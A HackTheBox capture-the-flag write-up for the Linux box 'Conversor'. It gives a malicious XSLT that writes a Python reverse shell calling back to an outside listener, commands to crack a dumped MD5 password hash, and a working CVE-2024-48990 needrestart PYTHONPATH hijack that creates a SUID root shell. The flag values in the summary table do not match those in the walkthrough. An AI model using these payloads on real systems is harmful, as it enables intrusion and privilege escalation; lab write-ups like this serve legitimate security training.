# Conversor — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux (Ubuntu 22.04.5 LTS)  
**Author:** Muhil M  
**Attack Chain:** XSLT EXSLT File Write → Cron RCE → MD5 Crack → SSH → CVE-2024-48990 PYTHONPATH Hijack → Root

---

## Machine Information

| Field | Detail |
|---|---|
| Name | Conversor |
| Difficulty | Easy |
| OS | Linux — Ubuntu 22.04.5 LTS |
| User Flag | `**ba1a824bc194c662a99136202642**` |
| Root Flag | `**e5aa8a3dc38c59f9a6447e1b0f26**` |

---

## Phase 1 — Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oN conversor.nmap 10.129.238.31
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: conversor.htb
```

Two ports — SSH and HTTP. The web server redirects to `conversor.htb`, requiring a virtual host entry:

```bash
echo "10.129.238.31 conversor.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2 — Web Application Analysis

### Source Code Disclosure

Navigating to `http://conversor.htb` presents a file conversion web app (XML + XSLT). The `/about` page exposes a downloadable source archive:

```bash
wget http://conversor.htb/static/source_code.tar.gz
tar xvf source_code.tar.gz
```

Extracted structure:

```
app.py          ← Flask application logic
install.md      ← Deployment notes (critical)
instance/
  users.db      ← SQLite database
scripts/        ← Cron-watched Python directory
uploads/
templates/
static/
```

### Critical Finding #1 — Cron Job

`install.md` contains the deployment cron entry:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Every minute, `www-data` executes every `.py` file in `/scripts/`. Write access to that directory equals RCE.

### Critical Finding #2 — Unrestricted XSLT Parsing

`app.py` shows the XML parser is hardened but the XSLT parser is not:

```python
# XML — restricted
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)

# XSLT — completely unrestricted
xslt_tree = etree.parse(xslt_path)   # ← no parser restrictions
transform = etree.XSLT(xslt_tree)
```

The EXSLT `exsl:document` extension is available and allows arbitrary file writes from within the XSLT transformation.

---

## Phase 3 — Initial Foothold (XSLT → Cron → Shell)

### Register and Authenticate

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://conversor.htb/login \
  -d "username=thrandomv&password=thrandomv123" \
  -L -o /dev/null
```

### Craft the Malicious XSLT

The XSLT uses `exsl:document` to write a Python reverse shell directly into the cron-watched `/scripts/` directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,os,pty
s=socket.socket()
s.connect(("10.10.14.31",9001))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/bash")
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

```bash
# Dummy XML required by the endpoint
cat > dummy.xml << 'EOF'
<?xml version="1.0"?>
<root><data>test</data></root>
EOF
```

### Upload and Wait

```bash
# Terminal 1 — listener
nc -lvnp 9001

# Terminal 2 — upload
curl -s -X POST http://conversor.htb/convert \
  -F "xml_file=@dummy.xml" \
  -F "xslt_file=@exploit.xslt" \
  -c cookies.txt -b cookies.txt
```

The cron fires within 60 seconds. Shell received as `www-data`.

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
```

---

## Phase 4 — Lateral Movement (www-data → fismathack)

### Extract Credentials from SQLite

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
```

### Crack MD5 Hash

The hash is unsalted MD5 — trivially cracked via CrackStation or hashcat:

```bash
hashcat -m 0 -a 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt
# → Keepmesafeandwarm
```

### SSH as fismathack

```bash
ssh fismathack@10.129.238.31
# Password: Keepmesafeandwarm

cat ~/user.txt
# 90ba1a824bc194c662a99136202642dc
```

---

## Phase 5 — Privilege Escalation (CVE-2024-48990)

### Sudo Enumeration

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### needrestart Version

```bash
/usr/sbin/needrestart --version
# needrestart 3.7
```

Version 3.7 is vulnerable to CVE-2024-48990. needrestart scans running Python processes and re-imports Python modules using the target process's `PYTHONPATH`. By poisoning `PYTHONPATH` with a malicious `sitecustomize.py`, any module imported by needrestart as root executes our code.

> **Key lesson from this box:** Shadowing `importlib` breaks Python's own bootstrap sequence before the payload runs. Use `sitecustomize.py` instead — Python executes it automatically at startup without needing an import, so it doesn't interfere with the interpreter's own initialisation.

### Exploit

```bash
# 1. Create malicious sitecustomize module
mkdir -p /tmp/pwn
cat > /tmp/pwn/sitecustomize.py << 'EOF'
import os
if os.geteuid() == 0:
    os.system('cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash')
EOF

# 2. Create bait Python process with hijacked PYTHONPATH
cat > /tmp/bait.py << 'EOF'
import time
time.sleep(300)
EOF

PYTHONPATH=/tmp/pwn python3 /tmp/bait.py &

# 3. Verify PYTHONPATH is visible in /proc (needrestart reads this)
cat /proc/$!/environ | tr '\0' '\n' | grep PYTHON
# PYTHONPATH=/tmp/pwn  ← confirmed

# 4. Trigger needrestart — scans Python procs, inherits PYTHONPATH, runs as root
sudo /usr/sbin/needrestart -r a

# 5. Verify SUID on /var/tmp (noexec on /tmp)
ls -la /var/tmp/rootbash
# -rwsr-xr-x 1 root root 1396520 ... /var/tmp/rootbash

# 6. Pop root shell
/var/tmp/rootbash -p
whoami   # root
cat /root/root.txt
# dde5aa8a3dc38c59f9a6447e1b0f26cb
```

**Note on `/tmp` vs `/var/tmp`:** `/tmp` is mounted `noexec` on this machine. Always try `/var/tmp` when SUID binaries fail to execute from `/tmp`.

---

## Attack Chain Summary

```
Recon
└─ Port 80 → conversor.htb → XML/XSLT conversion app
   └─ Source code exposed at /static/source_code.tar.gz

Initial Access
└─ XSLT parsed without restrictions (lxml + EXSLT)
   └─ exsl:document writes shell.py to /scripts/
      └─ Cron (www-data, every 60s) executes it
         └─ Reverse shell as www-data

Lateral Movement
└─ SQLite users.db → fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
   └─ MD5 cracked → Keepmesafeandwarm
      └─ SSH as fismathack → user.txt

Privilege Escalation
└─ sudo NOPASSWD: /usr/sbin/needrestart (v3.7, CVE-2024-48990)
   └─ PYTHONPATH=/tmp/pwn → sitecustomize.py injected
      └─ needrestart inherits PYTHONPATH, runs payload as root
         └─ cp /bin/bash /var/tmp/rootbash + chmod 4755
            └─ /var/tmp/rootbash -p → root → root.txt
```

---

## Vulnerabilities Summary

| Vulnerability | Impact |
|---|---|
| Source code disclosure | Exposes cron, credentials, app logic |
| Unrestricted XSLT parsing (EXSLT) | Arbitrary file write → RCE |
| Cron executing user-writable directory | RCE as www-data |
| Unsalted MD5 password hashing | Credential recovery via rainbow table |
| NOPASSWD sudo on needrestart | Local privilege escalation |
| CVE-2024-48990 (needrestart < 3.8) | PYTHONPATH hijack → root code execution |

---

## Tools Used

- `nmap` — port scanning
- `curl` — web interaction and exploit delivery
- `lxml` / EXSLT — XSLT file write primitive
- `sqlite3` — credential extraction
- `hashcat` — MD5 cracking
- `netcat` — reverse shell listener
- CVE-2024-48990 — needrestart PYTHONPATH hijack

---

*Written by thrandomv*
